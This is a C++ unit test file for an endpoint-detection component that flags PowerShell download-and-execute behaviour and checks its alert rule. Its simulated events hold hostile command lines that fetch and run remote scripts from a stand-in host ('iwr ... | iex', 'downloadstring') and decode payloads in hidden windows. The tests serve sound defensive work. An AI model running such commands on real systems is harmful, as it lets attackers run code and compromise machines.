/*
 * powershell_download_execute_detector_tests.cpp - Unit tests for
 * PowerShellDownloadExecuteDetector and the production rule it feeds.
 */
#include "powershell_download_execute_detector_tests.h"

#include <windows.h>

#include <algorithm>
#include <fstream>
#include <stdexcept>
#include <string>
#include <vector>

#include "edr_event.h"
#include "event_bus.h"
#include "powershell_download_execute_detector.h"
#include "rule_engine.h"

namespace {

#define PD_CHECK(condition) Check((condition), #condition, __LINE__)

void Check(bool condition, const char* expression, int line) {
    if (!condition)
        throw std::runtime_error(
            "powershell download-execute detector test failed at line " +
            std::to_string(line) + ": " + expression);
}

const char* ProductionRulesPath() {
    return GetFileAttributesA("..\\rules\\rules.json") !=
                   INVALID_FILE_ATTRIBUTES
        ? "..\\rules\\rules.json"
        : "rules\\rules.json";
}

bool Has(const std::vector<std::string>& hits, const char* id) {
    return std::find(hits.begin(), hits.end(), id) != hits.end();
}

edr::Event ProcessStart(uint32_t pid, uint32_t ppid,
                        const std::string& image,
                        const std::string& parent,
                        const std::string& cmd,
                        uint64_t ts100ns) {
    edr::Event event;
    event.type = EDR_EVT_PROCESS_START;
    event.ts100ns = ts100ns;
    event.pid = pid;
    event.ppid = ppid;
    event.fields[edr::field::kType] = "PROCESS_START";
    event.fields[edr::field::kImage] = image;
    event.fields[edr::field::kParentImage] = parent;
    event.fields[edr::field::kCommandLine] = cmd;
    return event;
}

void TestThresholdAndVerdict() {
    edr::PowerShellDownloadExecuteDetector detector(true, 600, 4096, 3);
    const uint64_t base = 1000000000ULL;
    const std::string parent = "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE";

    edr::Event first = ProcessStart(4001, 500,
        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        parent,
        "powershell -nop -w hidden -enc AAAA",
        base);
    detector.Enrich(first);
    PD_CHECK(first.fields.find(edr::field::kPowerShellDownloadExecuteScore) ==
             first.fields.end());

    edr::Event second = ProcessStart(4002, 500,
        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        parent,
        "powershell -w hidden iwr https://evil.test/a.ps1 | iex",
        base + 10000000ULL);
    detector.Enrich(second);
    PD_CHECK(second.fields.find(edr::field::kPowerShellDownloadExecuteScore) ==
             second.fields.end());

    edr::Event third = ProcessStart(4003, 500,
        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        parent,
        "powershell -w hidden downloadstring http://evil.test/b.ps1",
        base + 20000000ULL);
    detector.Enrich(third);
    PD_CHECK(third.fields.at(edr::field::kPowerShellDownloadExecuteCount) == "3");
    PD_CHECK(third.fields.at(edr::field::kPowerShellDownloadExecuteWindowSeconds) == "600");
    PD_CHECK(third.fields.at(edr::field::kPowerShellDownloadExecuteScore) == "75");
    PD_CHECK(third.fields.at(edr::field::kPowerShellDownloadExecuteVerdict) == "MALICIOUS");
}

void TestWindowExpiryResets() {
    edr::PowerShellDownloadExecuteDetector detector(true, 1, 4096, 2);
    const uint64_t base = 2000000000ULL;
    const std::string parent = "C:\\Users\\alice\\AppData\\Local\\Temp\\builder.exe";

    edr::Event first = ProcessStart(5001, 500,
        "C:\\Windows\\System32\\powershell.exe",
        parent,
        "powershell -w hidden iwr https://evil.test/a.ps1",
        base);
    detector.Enrich(first);
    edr::Event second = ProcessStart(5002, 500,
        "C:\\Windows\\System32\\powershell.exe",
        parent,
        "powershell -w hidden downloadstring http://evil.test/b.ps1",
        base + 1000000ULL);
    detector.Enrich(second);
    PD_CHECK(second.fields.at(edr::field::kPowerShellDownloadExecuteCount) == "2");

    edr::Event later = ProcessStart(5003, 500,
        "C:\\Windows\\System32\\powershell.exe",
        parent,
        "powershell -w hidden iwr https://evil.test/c.ps1",
        base + 11000000ULL);
    detector.Enrich(later);
    PD_CHECK(later.fields.find(edr::field::kPowerShellDownloadExecuteScore) ==
             later.fields.end());
}

void TestRulePipeline() {
    edr::RuleEngine engine;
    engine.LoadFromFile(ProductionRulesPath());
    std::vector<std::string> hits;
    engine.SetAlertCallback([&](const edr::Alert& alert) {
        hits.push_back(alert.ruleId);
    });

    edr::PowerShellDownloadExecuteDetector detector(true, 600, 4096, 3);
    const uint64_t base = 3000000000ULL;
    const std::string parent = "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE";

    edr::Event first = ProcessStart(6001, 100,
        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        parent,
        "powershell -w hidden iwr https://evil.test/a.ps1",
        base);
    detector.Enrich(first);
    engine.OnEvent(first);
    PD_CHECK(!Has(hits, "EDR-300"));

    edr::Event second = ProcessStart(6002, 100,
        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        parent,
        "powershell -w hidden downloadstring http://evil.test/b.ps1",
        base + 10000000ULL);
    detector.Enrich(second);
    engine.OnEvent(second);
    PD_CHECK(!Has(hits, "EDR-300"));

    edr::Event third = ProcessStart(6003, 100,
        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        parent,
        "powershell -w hidden frombase64string AAAA | iex",
        base + 20000000ULL);
    detector.Enrich(third);
    engine.OnEvent(third);
    PD_CHECK(Has(hits, "EDR-300"));
}

} // namespace

void RunPowerShellDownloadExecuteDetectorTests() {
    TestThresholdAndVerdict();
    TestWindowExpiryResets();
    TestRulePipeline();
}
